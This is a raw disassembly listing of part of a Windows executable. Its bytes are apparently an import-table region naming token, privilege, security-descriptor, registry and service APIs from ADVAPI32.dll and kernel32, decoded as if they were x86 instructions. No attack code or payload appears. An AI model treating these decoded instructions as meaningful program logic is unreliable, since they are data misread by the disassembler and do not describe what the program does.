  40e08b:	add    BYTE PTR [eax-0x19],bh
  40e08e:	add    BYTE PTR [eax],al
  40e090:	mov    edi,fs
  40e092:	add    BYTE PTR [eax],al
  40e094:	mov    ds:0xb80000e7,al
  40e099:	out    0x0,eax
  40e09b:	add    ah,al
  40e09d:	out    0x0,eax
  40e09f:	add    dl,bl
  40e0a1:	out    0x0,eax
  40e0a3:	add    dh,ch
  40e0a5:	out    0x0,eax
  40e0a7:	add    BYTE PTR [edx],al
  40e0a9:	call   0xe84ee0ae
  40e0ae:	add    BYTE PTR [eax],al
  40e0b0:	sub    ch,al
  40e0b2:	add    BYTE PTR [eax],al
  40e0b4:	cmp    al,ch
  40e0b6:	add    BYTE PTR [eax],al
  40e0b8:	inc    esi
  40e0b9:	call   0xe89ce0be
  40e0be:	add    BYTE PTR [eax],al
  40e0c0:	ins    BYTE PTR es:[edi],dx
  40e0c1:	call   0xe8bee0c6
  40e0c6:	add    BYTE PTR [eax],al
  40e0c8:	xchg   al,ch
  40e0ca:	add    BYTE PTR [eax],al
  40e0cc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e0cd:	call   0xe8f6e0d2
  40e0d2:	add    BYTE PTR [eax],al
  40e0d4:	(bad)  
  40e0d5:	call   0xe91ee0da
  40e0da:	add    BYTE PTR [eax],al
  40e0dc:	hlt    
  40e0dd:	call   0xe946e0e2
  40e0e2:	add    BYTE PTR [eax],al
  40e0e4:	adc    cl,ch
  40e0e6:	add    BYTE PTR [eax],al
  40e0e8:	sbb    al,0xe9
  40e0ea:	add    BYTE PTR [eax],al
  40e0ec:	xor    ch,cl
  40e0ee:	add    BYTE PTR [eax],al
  40e0f0:	ds jmp 0xe98ee0f6
  40e0f6:	add    BYTE PTR [eax],al
  40e0f8:	pop    esi
  40e0f9:	jmp    0xe9aee0fe
  40e0fe:	add    BYTE PTR [eax],al
  40e100:	sub    cl,0x0
  40e103:	add    BYTE PTR [eax-0x59ffff17],bl
  40e109:	jmp    0xea02e10e
  40e10e:	add    BYTE PTR [eax],al
  40e110:	shr    cl,1
  40e112:	add    BYTE PTR [eax],al
  40e114:	loopne 0x40e0ff
  40e116:	add    BYTE PTR [eax],al
  40e118:	clc    
  40e119:	jmp    0xea46e11e
  40e11e:	add    BYTE PTR [eax],al
  40e120:	push   ds
  40e121:	jmp    0x0:0xea2c0000
  40e128:	cmp    ch,dl
  40e12a:	add    BYTE PTR [eax],al
  40e12c:	dec    edx
  40e12d:	jmp    0x0:0xedc20000
  40e134:	mov    dl,0xed
  40e136:	add    BYTE PTR [eax],al
  40e138:	cwde   
  40e139:	in     eax,dx
  40e13a:	add    BYTE PTR [eax],al
  40e13c:	sub    ch,0x0
  40e13f:	add    ah,dl
  40e141:	in     eax,dx
  40e142:	add    BYTE PTR [eax],al
  40e144:	ins    BYTE PTR es:[edi],dx
  40e145:	in     eax,dx
  40e146:	add    BYTE PTR [eax],al
  40e148:	push   edx
  40e149:	in     eax,dx
  40e14a:	add    BYTE PTR [eax],al
  40e14c:	ds in  eax,dx
  40e14e:	add    BYTE PTR [eax],al
  40e150:	sub    ch,ch
  40e152:	add    BYTE PTR [eax],al
  40e154:	or     al,0xed
  40e156:	add    BYTE PTR [eax],al
  40e158:	cli    
  40e159:	in     al,dx
  40e15a:	add    BYTE PTR [eax],al
  40e15c:	add    BYTE PTR [eax],al
  40e15e:	add    BYTE PTR [eax],al
  40e160:	mov    esi,0xea
  40e165:	jmp    0x40e167
  40e167:	add    dh,ch
  40e169:	jmp    0x0:0xead20000
  40e170:	test   al,0xea
  40e172:	add    BYTE PTR [eax],al
  40e174:	cwde   
  40e175:	jmp    0x0:0xea820000
  40e17c:	outs   dx,BYTE PTR ds:[esi]
  40e17d:	jmp    0x0:0x0
  40e184:	inc    edx
  40e185:	jmp    0x40e187
  40e187:	add    BYTE PTR [eax-0x15],dl
  40e18a:	add    BYTE PTR [eax],al
  40e18c:	pusha  
  40e18d:	jmp    0x40e18f
  40e18f:	add    BYTE PTR [esi-0x15],ch
  40e192:	add    BYTE PTR [eax],al
  40e194:	jle    0x40e181
  40e196:	add    BYTE PTR [eax],al
  40e198:	nop
  40e199:	jmp    0x40e19b
  40e19b:	add    BYTE PTR [eax-0x5fffff15],bl
  40e1a1:	jmp    0x40e1a3
  40e1a3:	add    BYTE PTR [edx-0x47ffff15],ch
  40e1a9:	jmp    0x40e1ab
  40e1ab:	add    dh,al
  40e1ad:	jmp    0x40e1af
  40e1af:	add    dl,bl
  40e1b1:	jmp    0x40e1b3
  40e1b3:	add    dh,ah
  40e1b5:	jmp    0x40e1b7
  40e1b7:	add    ah,bh
  40e1b9:	jmp    0x40e1bb
  40e1bb:	add    BYTE PTR [esp+ebp*8],al
  40e1be:	add    BYTE PTR [eax],al
  40e1c0:	push   cs
  40e1c1:	in     al,dx
  40e1c2:	add    BYTE PTR [eax],al
  40e1c4:	sbb    al,0xec
  40e1c6:	add    BYTE PTR [eax],al
  40e1c8:	es in  al,dx
  40e1ca:	add    BYTE PTR [eax],al
  40e1cc:	xor    ah,ch
  40e1ce:	add    BYTE PTR [eax],al
  40e1d0:	cmp    ch,ah
  40e1d2:	add    BYTE PTR [eax],al
  40e1d4:	dec    esi
  40e1d5:	in     al,dx
  40e1d6:	add    BYTE PTR [eax],al
  40e1d8:	sbb    ch,bl
  40e1da:	add    BYTE PTR [eax],al
  40e1dc:	es jmp 0x40e1df
  40e1df:	add    BYTE PTR [ebx+ebp*8],dh
  40e1e2:	add    BYTE PTR [eax],al
  40e1e4:	add    BYTE PTR [eax],al
  40e1e6:	add    BYTE PTR [eax],al
  40e1e8:	js     0x40e1d6
  40e1ea:	add    BYTE PTR [eax],al
  40e1ec:	pop    esp
  40e1ed:	in     al,dx
  40e1ee:	add    BYTE PTR [eax],al
  40e1f0:	add    BYTE PTR [eax],al
  40e1f2:	add    BYTE PTR [eax],al
  40e1f4:	mov    al,0xec
  40e1f6:	add    BYTE PTR [eax],al
  40e1f8:	ret    0xec
  40e1fb:	add    al,bl
  40e1fd:	in     al,dx
  40e1fe:	add    BYTE PTR [eax],al
  40e200:	mov    gs,esp
  40e202:	add    BYTE PTR [eax],al
  40e204:	mov    al,ds:0xec
  40e209:	add    BYTE PTR [eax],al
  40e20b:	add    BYTE PTR [eax-0x63ffbf65],dl
  40e211:	loop   0x40e213
	...
  40e21b:	add    dh,dh
  40e21d:	out    0x0,al
  40e21f:	add    BYTE PTR [eax],al
  40e221:	loopne 0x40e223
  40e223:	add    BYTE PTR [eax],dl
  40e225:	jecxz  0x40e227
	...
  40e22f:	add    BYTE PTR [eax-0x16],ah
  40e232:	add    BYTE PTR [eax],al
  40e234:	je     0x40e216
  40e236:	add    BYTE PTR [eax],al
  40e238:	cld    
  40e239:	jecxz  0x40e23b
	...
  40e243:	add    BYTE PTR [esi],cl
  40e245:	jmp    0x40e247
  40e247:	add    BYTE PTR [eax-0x1f],ah
  40e24a:	add    BYTE PTR [eax],al
  40e24c:	and    ah,ah
	...
  40e256:	add    BYTE PTR [eax],al
  40e258:	lock jmp 0x40e25b
  40e25b:	add    BYTE PTR [ecx+eiz*8-0x1b7c0000],al
	...
  40e26a:	add    BYTE PTR [eax],al
  40e26c:	test   ah,ch
  40e26e:	add    BYTE PTR [eax],al
  40e270:	call   0x9040e356
  40e275:	in     al,0x0
	...
  40e27f:	add    al,dh
  40e281:	in     al,dx
  40e282:	add    BYTE PTR [eax],al
  40e284:	hlt    
  40e285:	loope  0x40e287
	...
  40e29b:	add    BYTE PTR [eax-0x43ffff1c],ch
  40e2a1:	in     al,0x0
  40e2a3:	add    dh,cl
  40e2a5:	in     al,0x0
  40e2a7:	add    ah,ch
  40e2a9:	in     al,0x0
  40e2ab:	add    dh,bh
  40e2ad:	in     al,0x0
  40e2af:	add    BYTE PTR [eiz*8-0x1ace0000],bl
  40e2b6:	add    BYTE PTR [eax],al
  40e2b8:	inc    eax
  40e2b9:	in     eax,0x0
  40e2bb:	add    BYTE PTR [ebp+eiz*8+0x0],cl
  40e2bf:	add    BYTE PTR [eax-0x1b],ah
  40e2c2:	add    BYTE PTR [eax],al
  40e2c4:	and    ch,0x0
  40e2c7:	add    BYTE PTR [ebp+eiz*8-0x1a4c0000],bl
  40e2ce:	add    BYTE PTR [eax],al
  40e2d0:	mov    esi,0xdc0000e5
  40e2d5:	in     eax,0x0
  40e2d7:	add    dh,ch
  40e2d9:	in     eax,0x0
  40e2db:	add    dh,bh
  40e2dd:	in     eax,0x0
  40e2df:	add    BYTE PTR [edx],bl
  40e2e1:	out    0x0,al
  40e2e3:	add    BYTE PTR [esi],ch
  40e2e5:	out    0x0,al
  40e2e7:	add    BYTE PTR [esi+eiz*8+0x0],cl
  40e2eb:	add    BYTE PTR [edx-0x1a],ah
  40e2ee:	add    BYTE PTR [eax],al
  40e2f0:	jb     0x40e2d8
  40e2f2:	add    BYTE PTR [eax],al
  40e2f4:	jl     0x40e2dc
  40e2f6:	add    BYTE PTR [eax],al
  40e2f8:	mov    esi,fs
  40e2fa:	add    BYTE PTR [eax],al
  40e2fc:	mov    ds:0xc00000e6,al
  40e301:	out    0x0,al
  40e303:	add    al,dl
  40e305:	out    0x0,al
  40e307:	add    al,ch
  40e309:	out    0x0,al
  40e30b:	add    BYTE PTR [eax],al
  40e30d:	add    BYTE PTR [eax],al
  40e30f:	add    BYTE PTR [edi+eiz*8],al
  40e312:	add    BYTE PTR [eax],al
  40e314:	push   ds
  40e315:	out    0x0,eax
  40e317:	add    BYTE PTR [edi+eiz*8],ch
  40e31a:	add    BYTE PTR [eax],al
  40e31c:	ds out 0x0,eax
  40e31f:	add    BYTE PTR [eax-0x19],bl
  40e322:	add    BYTE PTR [eax],al
  40e324:	out    0x0,ax
  40e327:	add    BYTE PTR [eax-0x19],bh
  40e32a:	add    BYTE PTR [eax],al
  40e32c:	mov    edi,fs
  40e32e:	add    BYTE PTR [eax],al
  40e330:	mov    ds:0xb80000e7,al
  40e335:	out    0x0,eax
  40e337:	add    ah,al
  40e339:	out    0x0,eax
  40e33b:	add    dl,bl
  40e33d:	out    0x0,eax
  40e33f:	add    dh,ch
  40e341:	out    0x0,eax
  40e343:	add    BYTE PTR [edx],al
  40e345:	call   0xe84ee34a
  40e34a:	add    BYTE PTR [eax],al
  40e34c:	sub    ch,al
  40e34e:	add    BYTE PTR [eax],al
  40e350:	cmp    al,ch
  40e352:	add    BYTE PTR [eax],al
  40e354:	inc    esi
  40e355:	call   0xe89ce35a
  40e35a:	add    BYTE PTR [eax],al
  40e35c:	ins    BYTE PTR es:[edi],dx
  40e35d:	call   0xe8bee362
  40e362:	add    BYTE PTR [eax],al
  40e364:	xchg   al,ch
  40e366:	add    BYTE PTR [eax],al
  40e368:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e369:	call   0xe8f6e36e
  40e36e:	add    BYTE PTR [eax],al
  40e370:	(bad)  
  40e371:	call   0xe91ee376
  40e376:	add    BYTE PTR [eax],al
  40e378:	hlt    
  40e379:	call   0xe946e37e
  40e37e:	add    BYTE PTR [eax],al
  40e380:	adc    cl,ch
  40e382:	add    BYTE PTR [eax],al
  40e384:	sbb    al,0xe9
  40e386:	add    BYTE PTR [eax],al
  40e388:	xor    ch,cl
  40e38a:	add    BYTE PTR [eax],al
  40e38c:	ds jmp 0xe98ee392
  40e392:	add    BYTE PTR [eax],al
  40e394:	pop    esi
  40e395:	jmp    0xe9aee39a
  40e39a:	add    BYTE PTR [eax],al
  40e39c:	sub    cl,0x0
  40e39f:	add    BYTE PTR [eax-0x59ffff17],bl
  40e3a5:	jmp    0xea02e3aa
  40e3aa:	add    BYTE PTR [eax],al
  40e3ac:	shr    cl,1
  40e3ae:	add    BYTE PTR [eax],al
  40e3b0:	loopne 0x40e39b
  40e3b2:	add    BYTE PTR [eax],al
  40e3b4:	clc    
  40e3b5:	jmp    0xea46e3ba
  40e3ba:	add    BYTE PTR [eax],al
  40e3bc:	push   ds
  40e3bd:	jmp    0x0:0xea2c0000
  40e3c4:	cmp    ch,dl
  40e3c6:	add    BYTE PTR [eax],al
  40e3c8:	dec    edx
  40e3c9:	jmp    0x0:0xedc20000
  40e3d0:	mov    dl,0xed
  40e3d2:	add    BYTE PTR [eax],al
  40e3d4:	cwde   
  40e3d5:	in     eax,dx
  40e3d6:	add    BYTE PTR [eax],al
  40e3d8:	sub    ch,0x0
  40e3db:	add    ah,dl
  40e3dd:	in     eax,dx
  40e3de:	add    BYTE PTR [eax],al
  40e3e0:	ins    BYTE PTR es:[edi],dx
  40e3e1:	in     eax,dx
  40e3e2:	add    BYTE PTR [eax],al
  40e3e4:	push   edx
  40e3e5:	in     eax,dx
  40e3e6:	add    BYTE PTR [eax],al
  40e3e8:	ds in  eax,dx
  40e3ea:	add    BYTE PTR [eax],al
  40e3ec:	sub    ch,ch
  40e3ee:	add    BYTE PTR [eax],al
  40e3f0:	or     al,0xed
  40e3f2:	add    BYTE PTR [eax],al
  40e3f4:	cli    
  40e3f5:	in     al,dx
  40e3f6:	add    BYTE PTR [eax],al
  40e3f8:	add    BYTE PTR [eax],al
  40e3fa:	add    BYTE PTR [eax],al
  40e3fc:	mov    esi,0xea
  40e401:	jmp    0x40e403
  40e403:	add    dh,ch
  40e405:	jmp    0x0:0xead20000
  40e40c:	test   al,0xea
  40e40e:	add    BYTE PTR [eax],al
  40e410:	cwde   
  40e411:	jmp    0x0:0xea820000
  40e418:	outs   dx,BYTE PTR ds:[esi]
  40e419:	jmp    0x0:0x0
  40e420:	inc    edx
  40e421:	jmp    0x40e423
  40e423:	add    BYTE PTR [eax-0x15],dl
  40e426:	add    BYTE PTR [eax],al
  40e428:	pusha  
  40e429:	jmp    0x40e42b
  40e42b:	add    BYTE PTR [esi-0x15],ch
  40e42e:	add    BYTE PTR [eax],al
  40e430:	jle    0x40e41d
  40e432:	add    BYTE PTR [eax],al
  40e434:	nop
  40e435:	jmp    0x40e437
  40e437:	add    BYTE PTR [eax-0x5fffff15],bl
  40e43d:	jmp    0x40e43f
  40e43f:	add    BYTE PTR [edx-0x47ffff15],ch
  40e445:	jmp    0x40e447
  40e447:	add    dh,al
  40e449:	jmp    0x40e44b
  40e44b:	add    dl,bl
  40e44d:	jmp    0x40e44f
  40e44f:	add    dh,ah
  40e451:	jmp    0x40e453
  40e453:	add    ah,bh
  40e455:	jmp    0x40e457
  40e457:	add    BYTE PTR [esp+ebp*8],al
  40e45a:	add    BYTE PTR [eax],al
  40e45c:	push   cs
  40e45d:	in     al,dx
  40e45e:	add    BYTE PTR [eax],al
  40e460:	sbb    al,0xec
  40e462:	add    BYTE PTR [eax],al
  40e464:	es in  al,dx
  40e466:	add    BYTE PTR [eax],al
  40e468:	xor    ah,ch
  40e46a:	add    BYTE PTR [eax],al
  40e46c:	cmp    ch,ah
  40e46e:	add    BYTE PTR [eax],al
  40e470:	dec    esi
  40e471:	in     al,dx
  40e472:	add    BYTE PTR [eax],al
  40e474:	sbb    ch,bl
  40e476:	add    BYTE PTR [eax],al
  40e478:	es jmp 0x40e47b
  40e47b:	add    BYTE PTR [ebx+ebp*8],dh
  40e47e:	add    BYTE PTR [eax],al
  40e480:	add    BYTE PTR [eax],al
  40e482:	add    BYTE PTR [eax],al
  40e484:	js     0x40e472
  40e486:	add    BYTE PTR [eax],al
  40e488:	pop    esp
  40e489:	in     al,dx
  40e48a:	add    BYTE PTR [eax],al
  40e48c:	add    BYTE PTR [eax],al
  40e48e:	add    BYTE PTR [eax],al
  40e490:	mov    al,0xec
  40e492:	add    BYTE PTR [eax],al
  40e494:	ret    0xec
  40e497:	add    al,bl
  40e499:	in     al,dx
  40e49a:	add    BYTE PTR [eax],al
  40e49c:	mov    gs,esp
  40e49e:	add    BYTE PTR [eax],al
  40e4a0:	mov    al,ds:0xec
  40e4a5:	add    BYTE PTR [eax],al
  40e4a7:	add    BYTE PTR [ebx],dl
  40e4a9:	add    cl,BYTE PTR [edi+0x70]
  40e4ac:	outs   dx,BYTE PTR gs:[esi]
  40e4ae:	push   eax
  40e4af:	jb     0x40e520
  40e4b1:	arpl   WORD PTR [ebp+0x73],sp
  40e4b4:	jae    0x40e50a
  40e4b6:	outs   dx,DWORD PTR ds:[esi]
  40e4b7:	imul   esp,DWORD PTR [ebp+0x6e],0x0
  40e4bb:	add    BYTE PTR [eax],bl
  40e4bd:	add    cl,BYTE PTR [edi+0x70]
  40e4c0:	outs   dx,BYTE PTR gs:[esi]
  40e4c2:	push   esp
  40e4c3:	push   0x64616572
  40e4c8:	push   esp
  40e4c9:	outs   dx,DWORD PTR ds:[esi]
  40e4ca:	imul   esp,DWORD PTR [ebp+0x6e],0x0
  40e4ce:	repnz add dl,BYTE PTR [ebx+0x74]
  40e4d2:	popa   
  40e4d3:	jb     0x40e549
  40e4d5:	push   ebx
  40e4d6:	gs jb  0x40e54f
  40e4d9:	imul   esp,DWORD PTR [ebx+0x65],0x6c727443
  40e4e0:	inc    esp
  40e4e1:	imul   esi,DWORD PTR [ebx+0x70],0x68637461
  40e4e8:	gs jb  0x40e542
  40e4eb:	add    bl,ch
  40e4ed:	add    dl,BYTE PTR [ebx+0x65]
  40e4f0:	je     0x40e546
  40e4f2:	push   0x64616572
  40e4f7:	push   esp
  40e4f8:	outs   dx,DWORD PTR ds:[esi]
  40e4f9:	imul   esp,DWORD PTR [ebp+0x6e],0x0
  40e4fd:	add    cl,ah
  40e4ff:	add    dl,BYTE PTR [ebx+0x65]
  40e502:	je     0x40e557
  40e504:	arpl   WORD PTR gs:[ebp+0x72],si
  40e508:	imul   esi,DWORD PTR [ecx+edi*2+0x44],0x72637365
  40e510:	imul   esi,DWORD PTR [eax+0x74],0x7247726f
  40e517:	outs   dx,DWORD PTR ds:[esi]
  40e518:	jne    0x40e58a
  40e51a:	add    BYTE PTR [eax],al
  40e51c:	outs   dx,DWORD PTR ds:[esi]
  40e51d:	add    DWORD PTR [edi+0x65],eax
  40e520:	je     0x40e576
  40e522:	outs   dx,DWORD PTR ds:[esi]
  40e523:	imul   esp,DWORD PTR [ebp+0x6e],0x49
  40e527:	outs   dx,BYTE PTR ds:[esi]
  40e528:	outs   dx,WORD PTR ds:[esi]
  40e52a:	jb     0x40e599
  40e52c:	popa   
  40e52d:	je     0x40e598
  40e52f:	outs   dx,DWORD PTR ds:[esi]
  40e530:	outs   dx,BYTE PTR ds:[esi]
  40e531:	add    BYTE PTR [ebp+0x2],dh
  40e534:	push   edx
  40e535:	gs addr16 inc ebp
  40e538:	outs   dx,BYTE PTR ds:[esi]
  40e539:	jne    0x40e5a8
  40e53b:	dec    ebx
  40e53c:	gs jns 0x40e596
  40e53f:	add    BYTE PTR [eax],bl
  40e541:	add    DWORD PTR [ebp+0x71],eax
  40e544:	jne    0x40e5a7
  40e546:	ins    BYTE PTR es:[edi],dx
  40e547:	push   ebx
  40e548:	imul   esp,DWORD PTR [eax+eax*1+0x0],0x65520293
  40e550:	addr16 push ecx
  40e552:	jne    0x40e5b9
  40e554:	jb     0x40e5cf
  40e556:	push   esi
  40e557:	popa   
  40e558:	ins    BYTE PTR es:[edi],dx
  40e559:	jne    0x40e5c0
  40e55b:	inc    ebp
  40e55c:	js     0x40e5b5
  40e55e:	add    BYTE PTR [eax],al
  40e560:	lea    eax,[ecx]
  40e562:	dec    ecx
  40e563:	outs   dx,BYTE PTR ds:[esi]
  40e564:	imul   esi,DWORD PTR [ecx+ebp*2+0x61],0x657a696c
  40e56c:	push   ebx
  40e56d:	arpl   WORD PTR gs:[ebp+0x72],si
  40e571:	imul   esi,DWORD PTR [ecx+edi*2+0x44],0x72637365
  40e579:	imul   esi,DWORD PTR [eax+0x74],0x726f
  40e580:	loopne 0x40e584
  40e582:	push   ebx
  40e583:	gs je  0x40e5d9
  40e586:	arpl   WORD PTR gs:[ebp+0x72],si
  40e58a:	imul   esi,DWORD PTR [ecx+edi*2+0x44],0x72637365
  40e592:	imul   esi,DWORD PTR [eax+0x74],0x6144726f
  40e599:	arpl   WORD PTR [eax+eax*1-0x53],bp
  40e59d:	add    DWORD PTR [edi+ebp*2+0x6f],ecx
  40e5a1:	imul   esi,DWORD PTR [ebp+0x70],0x50
  40e5a5:	jb     0x40e610
  40e5a7:	jbe    0x40e612
  40e5a9:	ins    BYTE PTR es:[edi],dx
  40e5aa:	gs addr16 gs push esi
  40e5ae:	popa   
  40e5af:	ins    BYTE PTR es:[edi],dx
  40e5b0:	jne    0x40e617
  40e5b2:	push   edi
  40e5b3:	add    BYTE PTR [esi],dh
  40e5b5:	add    DWORD PTR [edi+0x65],eax
  40e5b8:	je     0x40e5fb
  40e5ba:	arpl   WORD PTR [ebp+0x0],sp
  40e5bd:	add    BYTE PTR [esi+0x1],bl
  40e5c0:	inc    edi
  40e5c1:	gs je  0x40e617
  40e5c4:	arpl   WORD PTR gs:[ebp+0x72],si
  40e5c8:	imul   esi,DWORD PTR [ecx+edi*2+0x44],0x72637365
  40e5d0:	imul   esi,DWORD PTR [eax+0x74],0x654c726f
  40e5d7:	outs   dx,BYTE PTR ds:[esi]
  40e5d8:	addr16 je 0x40e643
  40e5db:	add    bl,bh
  40e5dd:	add    DWORD PTR [ebp+0x61],ecx
  40e5e0:	imul   esp,DWORD PTR [ebp+0x41],0x62
  40e5e4:	jae    0x40e655
  40e5e6:	ins    BYTE PTR es:[edi],dx
  40e5e7:	jne    0x40e65d
  40e5e9:	gs push ebx
  40e5eb:	inc    esp
  40e5ec:	add    BYTE PTR [eax],al
  40e5ee:	mov    WORD PTR [ecx],es
  40e5f0:	dec    ecx
  40e5f1:	outs   dx,BYTE PTR ds:[esi]
  40e5f2:	imul   esi,DWORD PTR [ecx+ebp*2+0x61],0x657a696c
  40e5fa:	inc    ecx
  40e5fb:	arpl   WORD PTR [eax+eax*1+0x20],bp
  40e5ff:	add    BYTE PTR [ecx+0x6c],al
  40e602:	ins    BYTE PTR es:[edi],dx
  40e603:	outs   dx,DWORD PTR ds:[esi]
  40e604:	arpl   WORD PTR [ecx+0x74],sp
  40e607:	gs inc ecx
  40e609:	outs   dx,BYTE PTR ds:[esi]
  40e60a:	fs dec ecx
  40e60c:	outs   dx,BYTE PTR ds:[esi]
  40e60d:	imul   esi,DWORD PTR [ecx+ebp*2+0x61],0x657a696c
  40e615:	push   ebx
  40e616:	imul   esp,DWORD PTR [eax+eax*1+0x0],0x655302ea
  40e61e:	je     0x40e673
  40e620:	gs jb  0x40e699
  40e623:	imul   esp,DWORD PTR [ebx+0x65],0x74617453
  40e62a:	jne    0x40e69f
  40e62c:	add    BYTE PTR [eax],al
  40e62e:	loop   0x40e632
  40e630:	push   ebx
  40e631:	gs je  0x40e687
  40e634:	arpl   WORD PTR gs:[ebp+0x72],si
  40e638:	imul   esi,DWORD PTR [ecx+edi*2+0x44],0x72637365
  40e640:	imul   esi,DWORD PTR [eax+0x74],0x774f726f
  40e647:	outs   dx,BYTE PTR ds:[esi]
  40e648:	gs jb  0x40e64b
  40e64b:	add    BYTE PTR [eax],dl
  40e64d:	add    BYTE PTR [ecx+0x64],al
  40e650:	fs inc ecx
  40e652:	arpl   WORD PTR [ebx+0x65],sp
  40e655:	jae    0x40e6ca
  40e657:	inc    ecx
  40e658:	ins    BYTE PTR es:[edi],dx
  40e659:	ins    BYTE PTR es:[edi],dx
  40e65a:	outs   dx,DWORD PTR ds:[esi]
  40e65b:	ja     0x40e6c2
  40e65d:	fs inc ecx
  40e65f:	arpl   WORD PTR [ebp+0x0],sp
  40e662:	mov    ecx,0x76655202
  40e667:	gs jb  0x40e6de
  40e66a:	push   esp
  40e66b:	outs   dx,DWORD PTR ds:[esi]
  40e66c:	push   ebx
  40e66d:	gs ins BYTE PTR es:[edi],dx
  40e66f:	data16 add BYTE PTR [eax],al
  40e672:	xor    eax,DWORD PTR [ecx]
  40e674:	inc    esi
  40e675:	jb     0x40e6dc
  40e677:	gs push ebx
  40e679:	imul   esp,DWORD PTR [eax+eax*1-0x7a],0x67655202
  40e681:	dec    edi
  40e682:	jo     0x40e6e9
  40e684:	outs   dx,BYTE PTR ds:[esi]
  40e685:	dec    ebx
  40e686:	gs jns 0x40e6ce
  40e689:	js     0x40e6e2
  40e68b:	add    ch,bh
  40e68d:	add    DWORD PTR [ebp+0x61],ecx
  40e690:	imul   esp,DWORD PTR [ebp+0x53],0x65
  40e694:	ins    BYTE PTR es:[edi],dx
  40e695:	push   dx
  40e697:	gs ins BYTE PTR es:[edi],dx
  40e699:	popa   
  40e69a:	je     0x40e705
  40e69c:	jbe    0x40e703
  40e69e:	push   ebx
  40e69f:	inc    esp
  40e6a0:	add    BYTE PTR [eax],al
  40e6a2:	lods   eax,DWORD PTR ds:[esi]
  40e6a3:	add    dl,BYTE PTR [edx+0x65]
  40e6a6:	imul   esi,DWORD PTR [bp+di+0x74],0x65537265
  40e6ae:	jb     0x40e726
  40e6b0:	imul   esp,DWORD PTR [ebx+0x65],0x6c727443
  40e6b7:	dec    eax
  40e6b8:	popa   
  40e6b9:	outs   dx,BYTE PTR ds:[esi]
  40e6ba:	fs ins BYTE PTR es:[edi],dx
  40e6bc:	gs jb  0x40e716
  40e6bf:	add    BYTE PTR [edx+0x1],cl
  40e6c2:	inc    edi
  40e6c3:	gs je  0x40e712
  40e6c6:	outs   dx,BYTE PTR gs:[esi]
  40e6c8:	addr16 je 0x40e733
  40e6cb:	push   ebx
  40e6cc:	imul   esp,DWORD PTR [eax+eax*1+0x0],0x6441001f
  40e6d4:	push   0x75
  40e6d6:	jae    0x40e74c
  40e6d8:	push   esp
  40e6d9:	outs   dx,DWORD PTR ds:[esi]
  40e6da:	imul   esp,DWORD PTR [ebp+0x6e],0x50
  40e6de:	jb     0x40e749
  40e6e0:	jbe    0x40e74b
  40e6e2:	ins    BYTE PTR es:[edi],dx
  40e6e3:	gs addr16 gs jae 0x40e6e8
  40e6e8:	push   ebp
  40e6e9:	add    dl,BYTE PTR [edx+0x65]
  40e6ec:	addr16 inc ebx
  40e6ee:	ins    BYTE PTR es:[edi],dx
  40e6ef:	outs   dx,DWORD PTR ds:[esi]
  40e6f0:	jae    0x40e757
  40e6f2:	dec    ebx
  40e6f3:	gs jns 0x40e6f6
  40e6f6:	inc    ecx
  40e6f7:	inc    esp
  40e6f8:	push   esi
  40e6f9:	inc    ecx
  40e6fa:	push   eax
  40e6fb:	dec    ecx
  40e6fc:	xor    esi,DWORD PTR [edx]
  40e6fe:	cs fs ins BYTE PTR es:[edi],dx
  40e701:	ins    BYTE PTR es:[edi],dx
  40e702:	add    BYTE PTR [eax],al
  40e704:	int3   
  40e705:	add    al,BYTE PTR [edi+0x65]
  40e708:	je     0x40e75d
  40e70a:	jns    0x40e77f
  40e70c:	je     0x40e773
  40e70e:	ins    DWORD PTR es:[edi],dx
  40e70f:	inc    esp
  40e710:	gs popaw 
  40e713:	jne    0x40e781
  40e715:	je     0x40e763
  40e717:	popa   
  40e718:	outs   dx,BYTE PTR ds:[esi]
  40e719:	addr16 dec ecx
  40e71b:	inc    esp
  40e71c:	add    BYTE PTR [eax],al
  40e71e:	push   ecx
  40e71f:	add    DWORD PTR [ebp+0x78],eax
  40e722:	imul   esi,DWORD PTR [eax+edx*2+0x72],0x7365636f
  40e72a:	jae    0x40e72c
  40e72c:	retf   0x4701
  40e72f:	gs je  0x40e775
  40e732:	outs   dx,DWORD PTR ds:[esi]
  40e733:	ins    DWORD PTR es:[edi],dx
  40e734:	ins    DWORD PTR es:[edi],dx
  40e735:	popa   
  40e736:	outs   dx,BYTE PTR ds:[esi]
  40e737:	fs dec esp
  40e739:	imul   ebp,DWORD PTR [esi+0x65],0x22a0057
  40e740:	inc    edi
  40e741:	gs je  0x40e789
  40e744:	outs   dx,BYTE PTR ds:[esi]
  40e745:	jbe    0x40e7b0
  40e747:	jb     0x40e7b8
  40e749:	outs   dx,BYTE PTR ds:[esi]
  40e74a:	ins    DWORD PTR es:[edi],dx
  40e74b:	outs   dx,BYTE PTR gs:[esi]
  40e74d:	je     0x40e7a5
  40e74f:	popa   
  40e750:	jb     0x40e7bb
  40e752:	popa   
  40e753:	bound  ebp,QWORD PTR [ebp+eiz*2+0x57]
  40e757:	add    BYTE PTR [esi+0x65724601],bl
  40e75d:	gs dec esp
  40e75f:	imul   esp,DWORD PTR [edx+0x72],0x797261
  40e766:	stos   DWORD PTR es:[edi],eax
  40e767:	add    ecx,DWORD PTR [edi+ebp*2+0x61]
  40e76b:	fs dec esp
  40e76d:	imul   esp,DWORD PTR [edx+0x72],0x45797261
  40e774:	js     0x40e7cd
  40e776:	add    BYTE PTR [eax],al
  40e778:	or     al,BYTE PTR [edx]
  40e77a:	inc    edi
  40e77b:	gs je  0x40e7c1
  40e77e:	jne    0x40e7f2
  40e780:	jb     0x40e7e7
  40e782:	outs   dx,BYTE PTR ds:[esi]
  40e783:	je     0x40e7d5
  40e785:	jb     0x40e7f6
  40e787:	arpl   WORD PTR [ebp+0x73],sp
  40e78a:	jae    0x40e78c
  40e78c:	add    al,BYTE PTR [bx+0x65]
  40e790:	je     0x40e7df
  40e792:	outs   dx,DWORD PTR ds:[esi]
  40e793:	fs jne 0x40e802
  40e796:	gs dec eax
  40e798:	popa   
  40e799:	outs   dx,BYTE PTR ds:[esi]
  40e79a:	fs ins BYTE PTR es:[edi],dx
  40e79c:	gs inc ebp
  40e79e:	js     0x40e7f7
  40e7a0:	add    BYTE PTR [eax],al
  40e7a2:	mov    ecx,0x69615705
  40e7a7:	je     0x40e7ef
  40e7a9:	outs   dx,DWORD PTR ds:[esi]
  40e7aa:	jb     0x40e7ff
  40e7ac:	imul   ebp,DWORD PTR [esi+0x67],0x624f656c
  40e7b3:	push   0x65
  40e7b5:	arpl   WORD PTR [eax+eax*1-0x6],si
